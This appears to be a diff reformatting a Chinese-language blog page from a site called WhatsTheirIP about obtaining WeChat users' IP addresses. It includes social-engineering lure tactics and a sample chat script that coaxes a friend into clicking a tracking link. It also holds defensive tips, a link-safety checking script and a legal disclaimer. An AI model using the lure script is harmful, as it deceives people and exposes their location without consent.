+            </h6>
+            <p class="card-text small">
+             利用当前热门事件制造话题
+            </p>
+           </div>
+          </div>
+         </div>
+         <div class="col-md-6">
+          <div class="card">
+           <div class="card-body">
+            <h6 class="card-title">
+             🎁 福利诱导
+            </h6>
+            <p class="card-text small">
+             提供免费资源或优惠信息
+            </p>
+           </div>
+          </div>
+         </div>
+         <div class="col-md-6">
+          <div class="card">
+           <div class="card-body">
+            <h6 class="card-title">
+             🆘 求助模式
+            </h6>
+            <p class="card-text small">
+             以求助的方式请对方帮忙
+            </p>
+           </div>
+          </div>
+         </div>
+        </div>
+        <h6 class="mt-4">
+         高级话术示例：
+        </h6>
+        <div class="bg-light p-3 rounded">
+         <div class="chat-bubble">
+          哈哈，刚才看到一个超有意思的测试 😄
+         </div>
+         <div class="chat-bubble">
+          能测出你最适合什么工作，我测出来是产品经理
+         </div>
+         <div class="chat-bubble">
+          你来试试看你是什么？我猜你可能是设计师类型的
+         </div>
+         <div class="chat-bubble">
+          https://career-test.example.com/test?ref=friend
+         </div>
+         <div class="chat-bubble received ms-auto">
+          哇真的吗？让我试试！
+         </div>
+        </div>
+       </div>
+      </div>
+     </section>
+     <!-- Detection and Prevention -->
+     <section class="mb-5">
+      <h2>
+       如何防止被获取IP？
+      </h2>
+      <div class="warning-box">
+       <h5>
+        <i class="bi bi-shield-exclamation text-warning">
+        </i>
+        防护措施
+       </h5>
+       <ul>
+        <li>
+         <strong>
+          谨慎点击链接
+         </strong>
+         ：特别是来源不明的链接
+        </li>
+        <li>
+         <strong>
+          使用VPN服务
+         </strong>
+         ：隐藏真实IP地址
+        </li>
+        <li>
+         <strong>
+          检查链接真实性
+         </strong>
+         ：使用短链接展开工具
+        </li>
+        <li>
+         <strong>
+          关闭图片自动加载
+         </strong>
+         ：避免追踪像素
+        </li>
+        <li>
+         <strong>
+          使用代理浏览器
+         </strong>
+         ：增加匿名性
+        </li>
+       </ul>
+      </div>
+      <div class="code-block">
+       <h6>
+        简单的链接安全检查脚本：
+       </h6>
+       <pre><code>// 微信链接安全检查
 function checkLinkSafety(url) {
     // 常见的追踪域名列表
     const suspiciousDomains = [
@@ -730,7 +1036,7 @@ function checkLinkSafety(url) {
         }
     }
     
-    if (suspiciousCount >= 2) {
+    if (suspiciousCount &gt;= 2) {
         return {
             safe: false,
             reason: '检测到多个追踪参数',
@@ -746,112 +1052,189 @@ function checkLinkSafety(url) {
 }
 
 // 使用示例
-const linkCheck = checkLinkSafety('https://example.com/test?track=123&ref=wechat');
+const linkCheck = checkLinkSafety('https://example.com/test?track=123&amp;ref=wechat');
 console.log(linkCheck);</code></pre>
-                    </div>
-                </section>
-
-                <!-- Legal Considerations -->
-                <section class="mb-5">
-                    <h2>法律和道德考量</h2>
-                    <div class="row g-4">
-                        <div class="col-md-6">
-                            <h4>✅ 合法应用场景</h4>
-                            <ul>
-                                <li>网络安全研究和学习</li>
-                                <li>个人网站访问统计</li>
-                                <li>企业用户行为分析</li>
-                                <li>经过授权的安全测试</li>
-                                <li>学术研究项目</li>
-                            </ul>
-                        </div>
-                        <div class="col-md-6">
-                            <h4>❌ 禁止使用场景</h4>
-                            <ul>
-                                <li>恶意追踪他人隐私</li>
-                                <li>网络骚扰和威胁</li>
-                                <li>商业间谍活动</li>
-                                <li>违反微信使用条款</li>
-                                <li>未经授权的信息收集</li>
-                            </ul>
-                        </div>
-                    </div>
-
-                    <div class="wechat-box mt-4">
-                        <h5><i class="bi bi-lightbulb text-white"></i> 专业建议</h5>
-                        <p class="mb-0">学习这些技术的目的应该是提升网络安全意识，保护自己不被恶意追踪。在实际应用中，务必遵守法律法规和平台规则，尊重他人隐私，将技术用于正当目的。</p>
-                    </div>
-                </section>
-
-                <!-- Conclusion -->
-                <section class="mb-5">
-                    <h2>总结</h2>
-                    <p>虽然微信有较强的隐私保护机制，但通过间接的技术手段仍然可能获取到用户的IP信息。了解这些方法有助于：</p>
-                    
-                    <ul>
-                        <li><strong>提升安全意识</strong>：识别和防范可能的IP追踪攻击</li>
-                        <li><strong>技术学习</strong>：理解网络通信和隐私保护原理</li>
-                        <li><strong>合规应用</strong>：在合法范围内使用相关技术</li>
-                        <li><strong>自我保护</strong>：采取措施保护个人隐私</li>
-                    </ul>
-
-                    <p><strong>最重要的是：</strong>技术本身是中性的，关键在于如何使用。请始终遵循法律法规，尊重他人隐私，将这些知识用于提升网络安全防护能力。</p>
-
-                    <div class="text-center mt-4">
-                        <a href="../../index" class="btn btn-success btn-lg" style="background-color: #1AAB8A; border-color: #1AAB8A;">了解更多IP追踪技术</a>
-                    </div>
-                </section>
-
-                <!-- Related Articles -->
-                <section class="mt-5">
-                    <h3>相关文章推荐</h3>
-                    <div class="row g-3">
-                        <div class="col-md-6">
-                            <div class="card">
-                                <div class="card-body">
-                                    <h6 class="card-title"><a href="how-to-get-others-ip-address" class="text-decoration-none">如何获取他人IP地址？5种实用方法详解</a></h6>
-                                    <p class="card-text small text-muted">全面了解IP获取的各种技术方法</p>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-md-6">
-                            <div class="card">
-                                <div class="card-body">
-                                    <h6 class="card-title"><a href="email-tracking-pixel-technology" class="text-decoration-none">邮件追踪像素技术详解</a></h6>
-                                    <p class="card-text small text-muted">学习邮件追踪的核心技术</p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-            </div>
+      </div>
+     </section>
+     <!-- Legal Considerations -->
+     <section class="mb-5">
+      <h2>
+       法律和道德考量
+      </h2>
+      <div class="row g-4">
+       <div class="col-md-6">
+        <h4>
+         ✅ 合法应用场景
+        </h4>
+        <ul>
+         <li>
+          网络安全研究和学习
+         </li>
+         <li>
+          个人网站访问统计
+         </li>
+         <li>
+          企业用户行为分析
+         </li>
+         <li>
+          经过授权的安全测试
+         </li>
+         <li>
+          学术研究项目
+         </li>
+        </ul>
+       </div>
+       <div class="col-md-6">
+        <h4>
+         ❌ 禁止使用场景
+        </h4>
+        <ul>
+         <li>
+          恶意追踪他人隐私
+         </li>
+         <li>
+          网络骚扰和威胁
+         </li>
+         <li>
+          商业间谍活动
+         </li>
+         <li>
+          违反微信使用条款
+         </li>
+         <li>
+          未经授权的信息收集
+         </li>
+        </ul>
+       </div>
+      </div>
+      <div class="wechat-box mt-4">
+       <h5>
+        <i class="bi bi-lightbulb text-white">
+        </i>
+        专业建议
+       </h5>
+       <p class="mb-0">
+        学习这些技术的目的应该是提升网络安全意识，保护自己不被恶意追踪。在实际应用中，务必遵守法律法规和平台规则，尊重他人隐私，将技术用于正当目的。
+       </p>
+      </div>
+     </section>
+     <!-- Conclusion -->
+     <section class="mb-5">
+      <h2>
+       总结
+      </h2>
+      <p>
+       虽然微信有较强的隐私保护机制，但通过间接的技术手段仍然可能获取到用户的IP信息。了解这些方法有助于：
+      </p>
+      <ul>
+       <li>
+        <strong>
+         提升安全意识
+        </strong>
+        ：识别和防范可能的IP追踪攻击
+       </li>
+       <li>
+        <strong>
+         技术学习
+        </strong>
+        ：理解网络通信和隐私保护原理
+       </li>
+       <li>
+        <strong>
+         合规应用
+        </strong>
+        ：在合法范围内使用相关技术
+       </li>
+       <li>
+        <strong>
+         自我保护
+        </strong>
+        ：采取措施保护个人隐私
+       </li>
+      </ul>
+      <p>
+       <strong>
+        最重要的是：
+       </strong>
+       技术本身是中性的，关键在于如何使用。请始终遵循法律法规，尊重他人隐私，将这些知识用于提升网络安全防护能力。
+      </p>
+      <div class="text-center mt-4">
+       <a class="btn btn-success btn-lg" href="../../index" style="background-color: #1AAB8A; border-color: #1AAB8A;">
+        了解更多IP追踪技术
+       </a>
+      </div>
+     </section>
+     <!-- Related Articles -->
+     <section class="mt-5">
+      <h3>
+       相关文章推荐
+      </h3>
+      <div class="row g-3">
+       <div class="col-md-6">
+        <div class="card">
+         <div class="card-body">
+          <h6 class="card-title">
+           <a class="text-decoration-none" href="how-to-get-others-ip-address">
+            如何获取他人IP地址？5种实用方法详解
+           </a>
+          </h6>
+          <p class="card-text small text-muted">
+           全面了解IP获取的各种技术方法
+          </p>
+         </div>
         </div>
+       </div>
+       <div class="col-md-6">
+        <div class="card">
+         <div class="card-body">
+          <h6 class="card-title">
+           <a class="text-decoration-none" href="email-tracking-pixel-technology">
+            邮件追踪像素技术详解
+           </a>
+          </h6>
+          <p class="card-text small text-muted">
+           学习邮件追踪的核心技术
+          </p>
+         </div>
+        </div>
+       </div>
+      </div>
+     </section>
     </div>
-
-    <!-- Footer -->
-    <footer class="bg-dark text-light py-4 mt-5">
-        <div class="container">
-            <div class="row">
-                <div class="col-md-6">
-                    <h5>WhatsTheirIP</h5>
-                    <p>专业的IP追踪和分析平台，提供安全可靠的网络情报服务。</p>
-                </div>
-                <div class="col-md-6">
-                    <h5>快速链接</h5>
-                    <ul class="list-unstyled">
-                        <li><a href="../../index" class="text-light text-decoration-none">首页</a></li>
-                        <li><a href="../index.html" class="text-light text-decoration-none">博客</a></li>
-                        <li><a href="../../index.html#privacy" class="text-light text-decoration-none">隐私政策</a></li>
-                    </ul>
-                </div>
-            </div>
-            <hr>
-            <div class="text-center">
-                <p>&copy; 2025 WhatsTheirIP. 保留所有权利。仅供学习和合法用途使用。</p>
-            </div>
-        </div>
-    </footer>
-
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-</body>
+   </div>
+  </div>
+  <!-- Footer -->
+  <footer class="bg-dark text-light py-4 mt-5">
+   <div class="container">
+    <div class="row">
+     <div class="col-md-6">
+      <h5>
+       WhatsTheirIP
+      </h5>
+      <p>
+       专业的IP追踪和分析平台，提供安全可靠的网络情报服务。
+      </p>
+     </div>
+     <div class="col-md-6">
+      <h5>
+       快速链接
+      </h5>
+      <ul class="list-unstyled">
+       <li>
+        隐私政策
+       </li>
+      </ul>
+     </div>
+    </div>
+    <hr/>
+    <div class="text-center">
+     <p>
+      © 2025 WhatsTheirIP.  保留所有权利。仅供学习和合法用途使用。
+     </p>
+    </div>
+   </div>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js">
+  </script>
+ </body>
 </html>
